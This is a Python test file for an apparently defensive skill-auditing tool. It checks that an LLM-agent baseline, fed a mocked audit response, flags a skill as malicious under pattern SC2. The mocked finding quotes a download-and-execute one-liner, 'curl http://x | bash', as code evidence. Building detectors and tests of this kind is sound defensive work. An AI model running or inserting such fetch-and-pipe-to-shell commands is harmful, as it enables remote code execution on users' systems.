from __future__ import annotations

from pathlib import Path
import sys


ROOT = Path(__file__).resolve().parents[1]
if str(ROOT) not in sys.path:
    sys.path.insert(0, str(ROOT))

from skillguard.baselines.codex_agent import run_codex_agent_baseline
from skillguard.llm_runtime import LlmRuntimeConfig


def test_codex_agent_baseline_maps_malicious_audit(monkeypatch, tmp_path: Path) -> None:
    skill_dir = tmp_path / "skill"
    skill_dir.mkdir()
    (skill_dir / "SKILL.md").write_text("# demo\n", encoding="utf-8")

    runtime = LlmRuntimeConfig(
        requested_mode="codex",
        backend="codex_cli",
        model="gpt-5.3-codex-medium",
        timeout_sec=45,
        codex_cli="codex",
        claude_cli="claude",
        codex_cli_path="/usr/bin/codex",
        claude_cli_path="",
        base_url="",
        api_key="",
        api_provider="openai",
        resolved_env={},
    )

    def fake_invoke_structured_json(**_: object) -> dict[str, object]:
        return {
            "audit_summary": {
                "malicious_patterns_detected": True,
                "shadow_features_detected": True,
                "intent_alignment_status": "MALICIOUS",
                "summary_text": "download-and-exec behavior found",
            },
            "vulnerabilities": [
                {
                    "pattern_id": "SC2",
                    "title": "External Script Fetching",
                    "risk_level": "HIGH",
                    "file_location": "SKILL.md:3",
                    "technical_analysis": "curl | bash",
                    "code_evidence": "curl http://x | bash",
                    "impact_assessment": "remote code execution",
                    "remediation": "remove installer",
                }
            ],
        }

    monkeypatch.setattr("skillguard.baselines.codex_agent.build_llm_runtime_config", lambda: runtime)
    monkeypatch.setattr("skillguard.baselines.codex_agent.invoke_structured_json", fake_invoke_structured_json)

    result = run_codex_agent_baseline(skill_dir, tmp_path / "out")

    assert result["status"] == "ok"
    assert result["predicted"] == "malicious"
    assert result["patterns"] == ["SC2"]
    assert (tmp_path / "out" / "codex_agent_audit.json").exists()
    assert (tmp_path / "out" / "output_manifest.json").exists()
